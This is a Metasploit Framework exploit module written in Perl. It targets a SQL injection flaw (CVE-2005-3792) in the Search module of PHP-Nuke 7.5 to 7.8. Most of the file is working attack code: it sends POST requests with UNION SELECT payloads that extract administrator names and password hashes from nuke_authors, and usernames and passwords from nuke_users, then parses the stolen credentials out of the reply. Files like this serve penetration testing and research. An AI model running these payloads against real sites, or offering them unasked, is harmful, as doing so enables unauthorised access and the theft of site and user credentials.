
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::phpnuke_search_module;
use base "Msf::Exploit";
use strict;
use Pex::Text;
use bytes;

my $advanced = { };

my $info = {
	'Name'     => 'PHPNuke Search Module SQL Injection Vulnerability',
	'Version'  => '$Revision: 1.1 $',
	'Authors'  => [ 'Matteo Cantoni <goony@nothink.org>' ],
	'Arch'     => [ ],
	'OS'       => [ ],
	'Priv'     => 0,
	'UserOpts' =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 80],
		'VHOST' => [0, 'DATA', 'The virtual host name of the server'],
		'DIR'   => [0, 'DATA', 'PHPNuke directory path', '/'],
		'SSL'   => [0, 'BOOL', 'Use SSL'],
	  },

	'Description' => Pex::Text::Freeform(qq{
		Multiple SQL injection vulnerabilities in the Search module in PHP-Nuke.
		Versions 7.5 - 7.8 are affected, older versions contain different code implementation
		and are not affected by bug. Newest version 7.9 is not vulnerable too.
}),

	'Refs' =>
	  [
		['OSVDB', '20866'],
		['BID', '15421'],
		['CVE', '2005-3792'],
		['URL', 'http://www.waraxe.us/advisory-46.html'],
		['MIL', '1523'],
	  ],

	'Keys' => ['phpnuke, nuke'],

	'DisclosureDate' => 'November 24 2005',
  };

sub new{
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
	return($self);
}

sub Exploit{
	my $self = shift;
	my $target_host    = $self->VHost;
	my $target_port    = $self->GetVar('RPORT');
	my $dir            = $self->GetVar('DIR');

	my $url = "http://$target_host$dir/modules.php?name=Search";

	my %queries = (
		'admin' => "query=foo%') UNION ALL SELECT 1,2,aid,pwd,5,6,7,8,9,10 FROM nuke_authors/*",
		'users' => "query=bar%') UNION ALL SELECT 1,2,username,user_password,5,6,7,8,9,10 FROM nuke_users/*"
	  );

	$self->PrintLine("[*] Establishing a connection to the target...");
	$self->PrintLine("[*] Try to retrieve admin and users accounts...");

	my @queries = ("admin","users");

	foreach my $query(@queries){

		my $q = $queries{$query};
		my $query_length = length($q);

		my $request_newpass =
		  "POST $url HTTP/1.1\r\n".
		  "Host: $target_host:$target_port\r\n".
		  "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\n".
		  "Connection: Close\r\n".
		  "Content-Type: application/x-www-form-urlencoded\r\n".
		  "Content-Length: $query_length\r\n\r\n".
		  "$q\r\n".
		  "\r\n";

		my $s = Msf::Socket::Tcp->new(
			'PeerAddr' => $target_host,
			'PeerPort' => $target_port,
			'SSL'      => $self->GetVar('SSL'),
		  );

		if ($s->IsError){
			$self->PrintLine('[*] Error creating socket: ' . $s->GetError);
			return;
		}

		$s->Send($request_newpass);

		my $results = $s->Recv(-1, 20);
		my @results = split(/<tr>/, $results);

		$s->Close();

		if (grep(/^HTTP\/1.1 200 OK/, @results)){

			$self->PrintLine('');

			foreach my $row(@results){
				if ($row =~ /username=/){
					my (undef,$a) = split(/username=/, $row);
					my @hash = split(/">/, $a);
					$self->Print("$hash[0] ");
				}

				if ($row =~ /article&sid=/){
					my (undef,$a) = split(/article&sid=1"><b>/, $row);
					my @hash = split(/<\/b>/, $a);
					$self->PrintLine("$hash[0]");
				}
			}
		} else {
			$self->PrintLine("[*] I can't retrive $query info...");
		}
	}

	return;
}

sub URLEncode{
	my $self = shift;
	my $data = shift;
	my $res;

	foreach my $c (unpack('C*', $data)) {
		if (
			($c >= 0x30 && $c <= 0x39) ||
			($c >= 0x41 && $c <= 0x5A) ||
			($c >= 0x61 && $c <= 0x7A)
		  ) {
			$res .= chr($c);
		} else {
			$res .= sprintf("%%%.2x", $c);
		}
	}
	return $res;
}

sub VHost{
	my $self = shift;
	my $name = $self->GetVar('VHOST') || $self->GetVar('RHOST');
	return $name;
}

1;
